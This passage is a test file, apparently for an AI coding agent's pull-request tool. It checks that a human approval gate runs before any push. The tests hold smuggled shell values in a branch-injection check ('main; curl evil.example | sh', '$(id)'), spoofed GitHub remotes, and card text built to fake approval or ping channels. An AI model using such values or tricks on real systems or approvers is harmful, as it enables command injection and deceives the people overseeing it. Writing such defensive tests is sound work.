// The agent tools driven through the REAL June turn engine (AgentSession over an in-memory
// store) with a fake sandbox and a fake GitHub — the approval gate is exercised end to
// end: park → Approve/Deny → resume → push + PR (or nothing).

import { describe, expect, test } from "bun:test";
import { AgentSession, grantAnswer, replyStream, ResumeAuthorizationError, type EventSink, type ModelReply, type Model, type Runtime, type Tool, type TurnEvent } from "@junejs/core/agent-runtime";
import { memorySessionStore } from "@junejs/core/test";
import { clip, workspaceTools, type ExecOptions, type Sandbox } from "../src/tools/workspace";
import { APPROVER_POLICY, approvalCard, isPlainRef, mayApprove, pullRequestTool, parseGithubRemote } from "../src/tools/pull-request";
import { APPROVAL_TTL_MS, approvalStore, approverGate } from "../src/approvals";
import { openKnowledge } from "../src/knowledge";
import type { GithubAccess } from "../src/github-auth";
import type { PrApprover } from "../src/config";

// A credential with no account to commit as (no identity provider), so no author check
// applies: these tests are about the approval gate, not who commits.
const staticToken = (token: string): GithubAccess => async () => token;
import { parseAllowlist, publicChannelsOnly } from "../src/policy";
import { directMessage, redirectText } from "../src/dm";
import { remoteSandbox } from "../src/sandbox-client";
import { agentIdentity, DEFAULT_AGENT_NAME } from "../src/identity";
import { systemPrompt } from "../src/prompts";

// Sandboxes in these tests don't publish.
const noPublish = { stage: async (): Promise<never> => { throw new Error("no publishing here"); }, push: async (): Promise<never> => { throw new Error("no publishing here"); } };

class Sink implements EventSink {
  subs = new Set<(e: TurnEvent) => void>();
  emit(e: TurnEvent) { this.subs.forEach((cb) => cb(e)); }
  subscribe(cb: (e: TurnEvent) => void) { this.subs.add(cb); return () => this.subs.delete(cb); }
}
const noRuntime: Runtime = { session() { throw new Error("no subagents"); } };
const scripted = (script: ModelReply[]): Model => (msgs) =>
  replyStream(script[Math.min(msgs.filter((m) => m.role === "assistant").length, script.length - 1)]!);

const SHA = "0123456789abcdef0123456789abcdef01234567";
const STAGE_ID = `1790000000-${"0".repeat(32)}`;
const DIGEST = "d".repeat(64);

// A sandbox whose checkout answers the few git commands open_pull_request still runs there
// (status, origin, default branch), and whose host stages and pushes: every exec and every
// publish call is recorded.
function fakeRepo(o: { dirty?: boolean; origin?: string; authors?: string[]; files?: string[]; patch?: string; patchTruncated?: boolean; diffSha256?: string; stageError?: string; pushError?: string } = {}) {
  const calls: { command: string; opts?: ExecOptions }[] = [];
  const published: { op: "stage" | "push"; args: Record<string, unknown> }[] = [];
  let stages = 0;
  const sb: Sandbox = {
    async exec(command, opts) {
      calls.push({ command, opts });
      const ok = (stdout: string) => ({ exitCode: 0, stdout, stderr: "" });
      if (command === "git status --porcelain") return ok(o.dirty ? " M src/a.ts\n" : "");
      if (command === "git remote get-url origin") return ok(`${o.origin ?? "https://github.com/acme/widgets.git"}\n`);
      if (command === "git rev-parse --abbrev-ref origin/HEAD") return ok("origin/main\n");
      if (command.startsWith("git update-ref refs/remotes/origin/")) return ok("");
      return { exitCode: 1, stdout: "", stderr: `unexpected: ${command}` };
    },
    async readFile() { return ""; },
    async writeFile() {},
    async stage(args) {
      published.push({ op: "stage", args });
      if (o.stageError) throw new Error(o.stageError);
      // As the host does: it bundles only what the checkout's origin/* doesn't have.
      if (calls.some((c) => c.command.startsWith("git update-ref refs/remotes/origin/"))) {
        throw new Error("stage: 409 no commits to publish: HEAD has nothing that isn't on GitHub already");
      }
      // As the host does: every stage gets a new id, the one its push must name.
      return {
        stage: `1790000000-${String(++stages).padStart(32, "0")}`,
        sha: SHA, baseSha: "f".repeat(40), commits: (o.authors ?? ["x"]).length,
        stat: " src/a.ts | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n",
        authors: o.authors ?? ["bot <b@x>|bot <b@x>"], files: o.files ?? ["src/a.ts"],
        patch: o.patch ?? "--- a/src/a.ts\n+++ b/src/a.ts\n-old\n+new\n", patchTruncated: o.patchTruncated ?? false, diffSha256: o.diffSha256 ?? DIGEST,
      };
    },
    async push(args) {
      published.push({ op: "push", args });
      if (o.pushError) throw new Error(o.pushError);
      return { sha: args.sha, branch: args.branch };
    },
  };
  return { sb, calls, published };
}

function fakeGithub(existing: unknown[] = []) {
  const reqs: { method: string; url: string; body?: unknown }[] = [];
  const f = (async (url: string, init?: RequestInit) => {
    const method = init?.method ?? "GET";
    reqs.push({ method, url, body: init?.body ? JSON.parse(String(init.body)) : undefined });
    if (method === "GET") return Response.json(existing);
    return Response.json({ html_url: "https://github.com/acme/widgets/pull/7", number: 7 }, { status: 201 });
  }) as typeof fetch;
  return { f, reqs };
}

const PR_CALL: ModelReply = {
  text: "Opening a PR.",
  toolCalls: [{ id: "c1", name: "open_pull_request", input: { branch: "scout/fix-a", title: "Fix a" } }],
};

function session(tool: Tool) {
  const store = memorySessionStore();
  const s = new AgentSession("agent", "slack:C1:1.1", store, new Sink(), scripted([PR_CALL, { text: "done", toolCalls: [] }]), [tool], noRuntime);
  const toolResult = () => store.messages().find((m) => m.role === "tool") as { result: Record<string, unknown> } | undefined;
  return { s, toolResult };
}

describe("open_pull_request — the approval gate", () => {
  test("parks with the host's staging on the card, then Approve has the host push the staged commit and opens a draft PR", async () => {
    const { sb, calls, published } = fakeRepo();
    const gh = fakeGithub();
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github: staticToken("ghs_secret"), fetch: gh.f }));

    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    const parked = await s.result(t1);
    expect(parked).toMatchObject({ status: "suspended" });
    expect(JSON.stringify(parked)).toContain("src/a.ts | 2 +-"); // the human sees the host's stat…
    expect(JSON.stringify(parked)).toContain("+new"); // …and the patch
    expect(published).toEqual([{ op: "stage", args: { repo: { owner: "acme", name: "widgets" }, base: "main", branch: "scout/fix-a", token: "ghs_secret" } }]);
    expect(gh.reqs).toHaveLength(0);

    const inputId = (parked as { request: { id: string } }).request.id;
    s.resume(t1, inputId, true);
    expect(await s.result(t1)).toMatchObject({ status: "completed", text: "done" });

    // The host pushes exactly the staged commit, naming the stage that recorded it: the
    // resumed run stages again (a stage authorizes one push) and pushes under that new
    // stage. The token never enters the sandbox.
    expect(published.map((p) => p.op)).toEqual(["stage", "stage", "push"]);
    const stage = `1790000000-${"2".padStart(32, "0")}`;
    expect(published.filter((p) => p.op === "push")).toEqual([{ op: "push", args: { stage, repo: { owner: "acme", name: "widgets" }, sha: SHA, branch: "scout/fix-a", token: "ghs_secret" } }]);
    expect(calls.some((c) => c.command.includes("push") || JSON.stringify(c.opts ?? {}).includes("ghs_secret"))).toBe(false);

    const post = gh.reqs.find((r) => r.method === "POST")!;
    expect(post.url).toBe("https://api.github.com/repos/acme/widgets/pulls");
    expect(post.body).toMatchObject({ head: "scout/fix-a", base: "main", title: "Fix a", draft: true });
    expect(toolResult()?.result).toMatchObject({ status: "opened", number: 7 });
  });

  test("read access to stage before approval; write access only after Approve, for that one repo", async () => {
    const { sb } = fakeRepo();
    const asked: string[] = [];
    const github = async (repo: { owner: string; name: string }, access: "read" | "write") => {
      asked.push(`${repo.owner}/${repo.name}:${access}`);
      return "ghs_short_lived";
    };
    const { s } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: fakeGithub().f }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    const parked = (await s.result(t1)) as { request: { id: string } };
    expect(asked).toEqual(["acme/widgets:read"]); // no write access before a human says yes
    s.resume(t1, parked.request.id, true);
    await s.result(t1);
    expect(asked.filter((a) => a.endsWith(":write"))).toEqual(["acme/widgets:write"]);
  });

  test("GitHub's API can be elsewhere (GITHUB_API_URL): the PR is looked up and opened there", async () => {
    const { sb } = fakeRepo();
    const gh = fakeGithub();
    const { s } = session(pullRequestTool({ sandboxFor: () => sb, github: staticToken("ghs_secret"), fetch: gh.f, apiUrl: "http://github.test/api/" }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    const parked = (await s.result(t1)) as { request: { id: string } };
    s.resume(t1, parked.request.id, true);
    await s.result(t1);
    expect(gh.reqs.map((r) => `${r.method} ${r.url}`)).toEqual([
      "GET http://github.test/api/repos/acme/widgets/pulls?state=open&head=acme:scout%2Ffix-a",
      "POST http://github.test/api/repos/acme/widgets/pulls",
    ]);
  });

  test("no credential (e.g. the App isn't installed there): the model is told before anyone is asked, nothing is staged", async () => {
    const { sb, published } = fakeRepo();
    const gh = fakeGithub();
    const github = async () => { throw new Error("the GitHub App isn't installed on acme/widgets"); };
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: gh.f }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    expect(await s.result(t1)).toMatchObject({ status: "completed" }); // never parked
    expect(published).toEqual([]);
    expect(gh.reqs).toHaveLength(0);
    expect(String(toolResult()?.result.error)).toContain("isn't installed on acme/widgets");
  });

  test("an origin not on github.com itself (the model can change it) gets no approval, no token, nothing published", async () => {
    const { sb, published } = fakeRepo({ origin: "https://evil.github.com/acme/widgets.git" });
    const asked: string[] = [];
    const github = async () => (asked.push("asked"), "ghs_secret");
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: fakeGithub().f }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    expect(await s.result(t1)).toMatchObject({ status: "completed" }); // never parked for approval
    expect(String(toolResult()?.result.error)).toContain("not a github.com remote");
    expect(asked).toEqual([]);
    expect(published).toEqual([]);
  });

  test("a commit not by the App's bot (by the host's reading) is sent back to be re-authored, before anyone is asked", async () => {
    const bot = "acme-agent[bot] <900+acme-agent[bot]@users.noreply.github.com>";
    const github = Object.assign(async () => "ghs_secret", { identity: async () => ({ name: "acme-agent[bot]", email: "900+acme-agent[bot]@users.noreply.github.com" }) });
    const outcome = async (authors: string[]) => {
      const { sb, published } = fakeRepo({ authors });
      const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: fakeGithub().f }));
      const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
      return { result: await s.result(t1), tool: toolResult()?.result, pushed: published.some((p) => p.op === "push") };
    };
    // One made-up author among two: no approval card, nothing pushed, and the model is told how to fix it.
    const wrong = await outcome([`${bot}|${bot}`, `Scout <scout@made-up.example>|${bot}`]);
    expect(wrong.result).toMatchObject({ status: "completed" });
    expect(String(wrong.tool?.error)).toContain("1 of 2 commit(s) on HEAD aren't by acme-agent[bot]");
    expect(String(wrong.tool?.error)).toContain("git rebase --exec 'git commit --amend --no-edit --reset-author' origin/main");
    expect(String(wrong.tool?.error)).toContain("if origin/main isn't in this checkout, fetch it with workspace_clone first");
    expect(wrong.pushed).toBe(false);
    // A committer that isn't the bot counts too.
    expect(String((await outcome([`${bot}|Scout <scout@made-up.example>`])).tool?.error)).toContain("aren't by");
    // All by the bot: on to the approval.
    expect((await outcome([`${bot}|${bot}`])).result).toMatchObject({ status: "suspended" });
  });

  test("when who the commits should be by can't be looked up, nobody is asked to approve them", async () => {
    const { sb, published } = fakeRepo({ authors: ["Scout <scout@made-up.example>|Scout <scout@made-up.example>"] });
    const asked: string[] = [];
    const github = Object.assign(async (_r: unknown, access: string) => (asked.push(access), "ghs_secret"), { identity: async () => { throw new Error("GitHub App: looking up the App: 502"); } });
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github, fetch: fakeGithub().f }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    expect(await s.result(t1)).toMatchObject({ status: "completed" }); // never parked
    expect(String(toolResult()?.result.error)).toContain("can't check who the commits are by");
    expect(asked).not.toContain("write");
    expect(published.some((p) => p.op === "push")).toBe(false);
  });

  test("an approval is asked for again when the repo, base, branch, title or diff differs, never reused", async () => {
    const ids: string[] = [];
    const ask = async (input: { branch: string; title: string; base?: string }, origin?: string, patch?: string, more: { patch?: string; patchTruncated?: boolean; diffSha256?: string } = {}) => {
      const { sb } = fakeRepo({ origin, patch, ...more });
      const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
      await tool.run(input, { requestInput: async (r: { id: string }) => { ids.push(r.id); return false; } } as never);
    };
    await ask({ branch: "scout/x", title: "x" });
    await ask({ branch: "scout/x", title: "x" }); // the same call: the same approval (a replay)
    await ask({ branch: "scout/x", title: "a new title" });
    await ask({ branch: "scout/x", title: "x", base: "develop" });
    await ask({ branch: "scout/y", title: "x" });
    await ask({ branch: "scout/x", title: "x" }, "https://github.com/acme/other.git");
    // The same commit with another diff (a replay after the base was rewritten), also when
    // the difference is past the excerpt the card shows.
    await ask({ branch: "scout/x", title: "x" }, undefined, "--- a/src/a.ts\n+++ b/src/a.ts\n-older\n+new\n");
    await ask({ branch: "scout/x", title: "x" }, undefined, "+x\n".repeat(5000) + "+y\n");
    await ask({ branch: "scout/x", title: "x" }, undefined, "+x\n".repeat(5000) + "+z\n");
    // The same commit, stat, files and patch excerpt, cut at the host's cap: only the
    // digest of the complete diff tells them apart.
    const cut = { patch: "+x\n".repeat(5000), patchTruncated: true };
    await ask({ branch: "scout/x", title: "x" }, undefined, undefined, { ...cut, diffSha256: "1".repeat(64) });
    await ask({ branch: "scout/x", title: "x" }, undefined, undefined, { ...cut, diffSha256: "2".repeat(64) });
    expect(ids[0]).toBe(ids[1]!);
    expect(new Set(ids).size).toBe(10);
  });

  test("a stage with no digest of its diff (an old host) is refused; nobody is asked", async () => {
    const { sb, published } = fakeRepo({ diffSha256: "" });
    let asked = false;
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
    const result = await tool.run({ branch: "scout/x", title: "x" }, { requestInput: async () => ((asked = true), true) } as never);
    expect(String((result as { error?: string }).error)).toContain("no digest of the staged diff");
    expect(asked).toBe(false);
    expect(published.map((p) => p.op)).toEqual(["stage"]);
  });

  test("a replay after the push (cut off before its result was saved) still reaches the PR", async () => {
    const { sb, published } = fakeRepo();
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
    const ctx = { requestInput: async () => true } as never;
    expect(await tool.run({ branch: "scout/x", title: "x" }, ctx)).toMatchObject({ status: "opened" });
    expect(await tool.run({ branch: "scout/x", title: "x" }, ctx)).toMatchObject({ status: "opened" });
    expect(published.map((p) => p.op)).toEqual(["stage", "push", "stage", "push"]);
    // A stage authorizes one push: the replay stages again and pushes under the new stage.
    const pushedStages = published.filter((p) => p.op === "push").map((p) => p.args.stage);
    expect(pushedStages).toEqual(published.filter((p) => p.op === "stage").map((_, i) => `1790000000-${String(i + 1).padStart(32, "0")}`));
  });

  test("a staging failure (nothing new, a base not on GitHub, refused commits) reaches the model; nobody is asked", async () => {
    const { sb, published } = fakeRepo({ stageError: "stage: 404 the base branch scout/readme-license isn't on GitHub" });
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
    const r = (await tool.run({ branch: "scout/x", title: "x", base: "scout/readme-license" }, { requestInput: async () => { throw new Error("asked"); } } as never)) as { error: string };
    expect(r.error).toBe("couldn't stage the commits: stage: 404 the base branch scout/readme-license isn't on GitHub");
    expect(published.map((p) => p.op)).toEqual(["stage"]);
  });

  test("a push the host refuses after approval (the branch moved on) is reported, and no PR is opened", async () => {
    const { sb } = fakeRepo({ pushError: "push: 409 push to scout/x: [rejected] (non-fast-forward)" });
    const gh = fakeGithub();
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: gh.f });
    const r = (await tool.run({ branch: "scout/x", title: "x" }, { requestInput: async () => true } as never)) as { error: string };
    expect(r.error).toBe("push failed: push: 409 push to scout/x: [rejected] (non-fast-forward)");
    expect(gh.reqs).toHaveLength(0);
  });

  test("the card flags changes under .github/ and keeps within Slack's 3000 characters, the patch cut to fit", () => {
    const staged = { stage: STAGE_ID, sha: SHA, baseSha: "f".repeat(40), commits: 2, stat: " .github/workflows/ci.yml | 3 +\n src/a.ts | 1 +\n 2 files changed\n", authors: [], files: [".github/workflows/ci.yml", "src/a.ts"], patch: "+x\n".repeat(5000) + "```", patchTruncated: false, diffSha256: DIGEST };
    const card = approvalCard({ repo: { owner: "acme", name: "widgets" }, branch: "scout/x", base: "main", title: "Fix", staged });
    expect(card).toContain("2 commits");
    expect(card).toContain(":warning: Changes `.github/workflows/ci.yml`");
    expect(card).toContain("… (truncated)");
    expect(card.length).toBeLessThanOrEqual(3000);
    expect(card.match(/```/g)!.length % 2).toBe(0);
    // A fence in the part of the patch that is shown can't break out of its block.
    const fenced = approvalCard({ repo: { owner: "acme", name: "widgets" }, branch: "scout/x", base: "main", title: "Fix", staged: { ...staged, patch: "```\nevil\n" } });
    expect(fenced).toContain("evil");
    expect(fenced.match(/```/g)!.length % 2).toBe(0);
  });

  test("nothing the sandbox or the model wrote can add markup to the card", () => {
    const staged = {
      stage: STAGE_ID, sha: SHA, baseSha: "f".repeat(40), commits: 1, authors: [],
      stat: " .github/x`y | 1 +\n``````\n<!here> | 1 +\n",
      files: [".github/a`<@U1>`b"],
      patch: "+<https://evil.example|click> &lt; ``````\n",
      patchTruncated: false, diffSha256: DIGEST,
    };
    const card = approvalCard({ repo: { owner: "acme", name: "widgets" }, branch: "scout/x", base: "main", title: "Fix <!channel>\n*Approved by security*", staged });
    expect(card).not.toMatch(/<[!@#]|<https?:/); // no mention, @channel or link
    expect(card).toContain("&lt;!channel&gt;");
    expect(card).toContain("&amp;lt;"); // an entity in the patch is shown as written
    expect(card.match(/```/g)).toHaveLength(4); // only the two blocks' own fences
    expect(card).toContain("`.github/aˋ&lt;@U1&gt;ˋb`"); // a path can't close its code span
    expect(card).toContain("*Fix &lt;!channel&gt; *Approved by security**"); // the title stays on its line
  });

  test("the card fits Slack's 3000 characters whatever the title, branch, stat and paths", () => {
    const long = (n: number) => "a".repeat(n);
    const staged = {
      stage: STAGE_ID, sha: SHA, baseSha: "f".repeat(40), commits: 2, authors: [], patch: "+x\n".repeat(5000), patchTruncated: true, diffSha256: DIGEST,
      stat: Array.from({ length: 30 }, (_, i) => ` ${long(500)}${i} | 1 +`).join("\n") + "\n",
      files: Array.from({ length: 10 }, (_, i) => `.github/${long(500)}${i}`),
    };
    const card = approvalCard({ repo: { owner: long(39), name: long(100) }, branch: `scout/${long(194)}`, base: long(200), title: "<".repeat(5000), staged });
    expect(card.length).toBeLessThanOrEqual(3000);
    expect(card.match(/```/g)!.length % 2).toBe(0);
    expect(card).toContain(":warning: Changes");
  });

  test("the card flags a .github/ path with unusual characters, kept on one line", () => {
    // The host lists paths unquoted (-z), so one can hold anything but NUL.
    const staged = { stage: STAGE_ID, sha: SHA, baseSha: "f".repeat(40), commits: 1, stat: " 1 file changed\n", authors: [], files: [".github/workflows/\u00e9\n\t.yml"], patch: "", patchTruncated: false, diffSha256: DIGEST };
    const card = approvalCard({ repo: { owner: "acme", name: "widgets" }, branch: "scout/x", base: "main", title: "Fix", staged });
    expect(card).toContain(":warning: Changes `.github/workflows/\u00e9\ufffd\ufffd.yml`:");
  });

  test("the card flags a rename away from .github/ or CODEOWNERS (the host lists both paths)", () => {
    // What the host lists for `git mv .github/workflows/ci.yml old/ci.yml` and
    // `git mv docs/CODEOWNERS old/CODEOWNERS`: each source and each destination.
    const staged = {
      stage: STAGE_ID, sha: SHA, baseSha: "f".repeat(40), commits: 1, stat: " 2 files changed, 0 insertions(+), 0 deletions(-)\n", authors: [],
      files: [".github/workflows/ci.yml", "docs/CODEOWNERS", "old/CODEOWNERS", "old/ci.yml"], patch: "", patchTruncated: false, diffSha256: DIGEST,
    };
    const card = approvalCard({ repo: { owner: "acme", name: "widgets" }, branch: "scout/x", base: "main", title: "Tidy", staged });
    expect(card).toContain(":warning: Changes `.github/workflows/ci.yml`, `docs/CODEOWNERS`:");
  });

  test("the card flags CODEOWNERS wherever GitHub reads it", () => {
    const staged = { stage: STAGE_ID, sha: SHA, baseSha: "f".repeat(40), commits: 1, stat: " 2 files changed\n", authors: [], files: ["CODEOWNERS", "docs/CODEOWNERS", "src/CODEOWNERS"], patch: "", patchTruncated: false, diffSha256: DIGEST };
    const card = approvalCard({ repo: { owner: "acme", name: "widgets" }, branch: "scout/x", base: "main", title: "Fix", staged });
    expect(card).toContain(":warning: Changes `CODEOWNERS`, `docs/CODEOWNERS`:");
  });

  test("a base that isn't a plain branch name never reaches a shell command", async () => {
    for (const base of ["main; curl evil.example | sh", "$(id)", "main`id`", "-x", "a..b", "main && true", "main\nid"]) {
      const { sb, calls } = fakeRepo();
      const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
      expect(await tool.run({ branch: "scout/x", title: "x", base }, {} as never)).toMatchObject({ error: expect.stringContaining("base must be a plain branch name") });
      expect(calls).toHaveLength(0);
    }
    // nor does a default branch the sandbox reports that isn't one
    const { sb, published } = fakeRepo();
    const exec = sb.exec.bind(sb);
    sb.exec = async (command, opts) => (command === "git rev-parse --abbrev-ref origin/HEAD" ? { exitCode: 0, stdout: "origin/main;id\n", stderr: "" } : exec(command, opts));
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
    expect(await tool.run({ branch: "scout/x", title: "x" }, {} as never)).toMatchObject({ error: expect.stringContaining("isn't a plain branch name") });
    expect(published).toEqual([]); // stopped before the host is asked to stage against it
  });

  test("isPlainRef: ordinary branch names only", () => {
    for (const ok of ["main", "develop", "release/1.2", "scout/fix-a_b.c"]) expect(isPlainRef(ok)).toBe(true);
    for (const bad of ["", "-main", "/main", "a..b", "a//b", "a/", "x.lock", "a b", "a;b", "a$b", "a`b", "a|b", "a\nb"]) expect(isPlainRef(bad)).toBe(false);
  });

  test("Deny pushes nothing", async () => {
    const { sb, calls, published } = fakeRepo();
    const gh = fakeGithub();
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: gh.f }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    const parked = (await s.result(t1)) as { request: { id: string } };
    s.resume(t1, parked.request.id, false);
    await s.result(t1);
    expect(calls.some((c) => c.command.includes("push"))).toBe(false);
    expect(published.some((p) => p.op === "push")).toBe(false); // staged for the card, never pushed by the host
    expect(gh.reqs).toHaveLength(0);
    expect(toolResult()?.result).toMatchObject({ status: "denied" });
  });

  test("an already-open PR for the branch is returned, not duplicated", async () => {
    const { sb } = fakeRepo();
    const gh = fakeGithub([{ html_url: "https://github.com/acme/widgets/pull/3", number: 3 }]);
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: gh.f }));
    const t1 = s.start({ turnId: "t1", userText: "open a PR" }).turnId;
    s.resume(t1, ((await s.result(t1)) as { request: { id: string } }).request.id, true);
    await s.result(t1);
    expect(gh.reqs.filter((r) => r.method === "POST")).toHaveLength(0);
    expect(toolResult()?.result).toMatchObject({ status: "exists", number: 3 });
  });

  test("uncommitted changes fail fast — no approval is asked for", async () => {
    const { sb } = fakeRepo({ dirty: true });
    const { s, toolResult } = session(pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f }));
    expect(await s.result(s.start({ turnId: "t1", userText: "open a PR" }).turnId)).toMatchObject({ status: "completed" });
    expect(toolResult()?.result).toMatchObject({ error: expect.stringContaining("uncommitted") });
  });

  test("branches outside the agent prefix (scout/) are refused", async () => {
    const { sb, calls } = fakeRepo();
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
    const out = await tool.run({ branch: "main", title: "x" }, {} as never);
    expect(out).toMatchObject({ error: expect.stringContaining("scout/") });
    expect(calls).toHaveLength(0);
  });

  test("parseGithubRemote handles https and ssh forms", () => {
    expect(parseGithubRemote("https://github.com/acme/widgets.git")).toEqual({ owner: "acme", name: "widgets" });
    expect(parseGithubRemote("git@github.com:acme/widgets")).toEqual({ owner: "acme", name: "widgets" });
    expect(parseGithubRemote("ssh://git@github.com/acme/widgets.git\n")).toEqual({ owner: "acme", name: "widgets" });
    // Only github.com itself: the push is handed a token for the repo this names.
    for (const bad of [
      "https://gitlab.com/a/b",
      "https://evil.github.com/acme/widgets.git",
      "https://github.com.evil.example/acme/widgets.git",
      "https://evil.example/github.com/acme/widgets.git",
      "https://x-access-token:t@github.com/acme/widgets.git",
      "git@evil.example:github.com/acme/widgets.git",
      "acme/widgets",
    ]) expect(() => parseGithubRemote(bad)).toThrow(/not a github.com remote/);
  });
});

describe("open_pull_request — who may approve (PR_APPROVER)", () => {
  test("requester: only the requester; anyone: any identified clicker, the requester included; not-requester: anyone identified but the requester", () => {
    const scope = { requester: "U1" };
    expect(mayApprove("requester", "U1", scope)).toBe(true);
    expect(mayApprove("requester", "U2", scope)).toBe(false);
    expect(mayApprove("anyone", "U1", scope)).toBe(true);
    expect(mayApprove("anyone", "U2", scope)).toBe(true);
    expect(mayApprove("not-requester", "U1", scope)).toBe(false);
    expect(mayApprove("not-requester", "U2", scope)).toBe(true);
    // A click with no verified clicker is nobody's.
    for (const rule of ["requester", "anyone", "not-requester"] as const) expect(mayApprove(rule, undefined, scope)).toBe(false);
    // A card whose requester isn't known can't be checked against them: nobody may.
    for (const rule of ["requester", "not-requester"] as const) {
      for (const s of [{ requester: null }, {}, undefined, { requester: "" }]) expect(mayApprove(rule, "U2", s)).toBe(false);
    }
  });

  // A Slack thread through the real engine, wired as src/app.ts wires it: the gate
  // (approverGate over an approvalStore in Lorehouse's own database) is June's
  // authorizeAnswer, asked through June's own grantAnswer. `turns` scripts the model: each
  // turn calls open_pull_request (`calls` times, a retry after the first) and then answers.
  // `preDeploy` posts the card as the tool did before PR_APPROVER (no answerers named), so
  // June resumes it for the requester alone without asking the gate.
  type Thread = {
    rule?: PrApprover; speaker?: { id: string; attested?: boolean } | null; calls?: number; turns?: number;
    pushFailures?: number; existing?: unknown[]; postStatus?: number; writeError?: boolean; preDeploy?: (turn: number) => boolean;
  };
  const thread = (o: Thread = {}) => {
    const rule = o.rule ?? "requester";
    const approvals = approvalStore(openKnowledge(":memory:"));
    const { sb, published } = fakeRepo();
    let failures = o.pushFailures ?? 0;
    const push = sb.push.bind(sb);
    sb.push = async (args) => {
      const r = await push(args);
      if (failures-- > 0) throw new Error("host busy");
      return r;
    };
    const reqs: { method: string; body?: unknown }[] = [];
    const f = (async (_url: string, init?: RequestInit) => {
      const method = init?.method ?? "GET";
      reqs.push({ method, body: init?.body ? JSON.parse(String(init.body)) : undefined });
      if (method === "GET") return Response.json(o.existing ?? []);
      if (o.postStatus) return new Response("nope", { status: o.postStatus });
      return Response.json({ html_url: "https://github.com/acme/widgets/pull/7", number: 7 }, { status: 201 });
    }) as typeof fetch;
    const github: GithubAccess = async (_repo, access) => {
      if (access === "write" && o.writeError) throw new Error("the App isn't installed there");
      return "t";
    };
    const names = async (id: string) => ({ U1: "Rex Quinn", U2: "Ada Park", U3: "Bo Chen" } as Record<string, string>)[id];
    const tool = pullRequestTool({ sandboxFor: () => sb, github, fetch: f, approver: rule, approvals, approverName: names });
    let turn = 0;
    const asTool: Tool = {
      ...tool,
      run: async (input, ctx) => tool.run(input, o.preDeploy?.(turn) ? { ...ctx, requestInput: (r: { id: string; prompt: string }) => ctx.requestInput({ id: r.id, prompt: r.prompt }) } : ctx),
    };
    const done: ModelReply = { text: "done", toolCalls: [] };
    const perTurn = [...Array.from({ length: o.calls ?? 1 }, () => PR_CALL), done];
    const script = Array.from({ length: o.turns ?? 1 }, () => perTurn).flat();
    const store = memorySessionStore();
    const s = new AgentSession("agent", "slack:C1:1.1", store, new Sink(), scripted(script), [asTool], noRuntime);
    const authorize = approverGate(rule, approvals, () => s);
    const speaker = o.speaker === undefined ? { id: "U1", attested: true } : (o.speaker ?? undefined);
    const start = (ts: string) => {
      turn++;
      return s.start({ turnId: `t${turn}`, userText: "open a PR", event: { source: "slack", kind: "app_mention", channelId: "C1", ts, user: speaker } }).turnId;
    };
    const click = async (turnId: string, by: string, answer = true) => {
      const parked = (await s.result(turnId)) as { request: { id: string } };
      const granted = await grantAnswer(s, { turnId, inputId: parked.request.id, by }, authorize);
      return () => s.resume(turnId, parked.request.id, answer, { by, granted });
    };
    const toolResults = () => store.messages().filter((m) => m.role === "tool").map((m) => (m as { result: Record<string, unknown> }).result);
    const pushes = () => published.filter((p) => p.op === "push").length;
    const posts = () => reqs.filter((r) => r.method === "POST");
    const prBody = () => ((posts()[0]?.body as { body?: string } | undefined)?.body ?? "");
    return { s, approvals, start, click, toolResults, pushes, posts, prBody, published };
  };

  test("with no verified requester, a rule that needs one posts no card: nothing is staged, and the model is told", async () => {
    for (const rule of ["requester", "not-requester"] as const) {
      for (const speaker of [null, { id: "U1" }]) {
        const t = thread({ rule, speaker });
        const t1 = t.start("1.1");
        expect(await t.s.result(t1)).toMatchObject({ status: "completed" }); // never parked
        expect(String(t.toolResults()[0]?.error)).toContain("can't tell who asked for this pull request");
        expect(t.published).toHaveLength(0);
      }
    }
    // Under anyone there is nobody to check against, so the card goes up as usual.
    const open = thread({ rule: "anyone", speaker: { id: "U1" } });
    expect(await open.s.result(open.start("1.1"))).toMatchObject({ status: "suspended" });
  });

  test("the card names the approver policy with the requester and its turn", async () => {
    const t = thread({ rule: "anyone" });
    const parked = (await t.s.result(t.start("1.1"))) as { request: { answerers?: unknown; prompt: string } };
    expect(parked.request.answerers).toEqual({ policy: APPROVER_POLICY, scope: { requester: "U1", turn: "1.1" } });
    expect(parked.request.prompt).not.toContain("someone other than");
    const strict = thread({ rule: "not-requester" });
    expect(((await strict.s.result(strict.start("1.1"))) as { request: { prompt: string } }).request.prompt).toContain("Approved or denied by someone other than the person who asked for it.");
  });

  test("requester (the default): someone else's Approve and Deny are refused and nothing is pushed; the requester's opens it", async () => {
    const t = thread();
    const t1 = t.start("1.1");
